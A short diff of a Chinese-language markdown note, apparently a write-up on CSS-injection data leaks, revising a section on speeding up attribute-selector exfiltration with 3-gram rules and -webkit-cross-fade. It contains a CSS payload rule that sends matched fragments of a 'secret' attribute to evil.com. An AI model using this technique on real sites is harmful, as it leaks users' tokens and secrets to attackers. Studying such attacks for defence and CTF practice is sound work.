@@ -52,7 +52,7 @@
 ```
 
 ### trigram 切片（加速）
-单字符 leak 太慢（需 256 条规则逐个试）。改用 **3-gram**（hex 字符集 16^3=4096 条规则）：
+单字符逐个 leak 需要多轮请求。改用 **3-gram + -webkit-cross-fade** 在单次请求中并行检测所有组合（hex 字符集 16^3=4096 条规则）：
 ```css
 [secret*="a3f"] { --a3f: url("//evil.com/leak?q=a3f"); }
 /* 用 -webkit-cross-fade 把所有规则挂到一个元素，命中即发请求 */
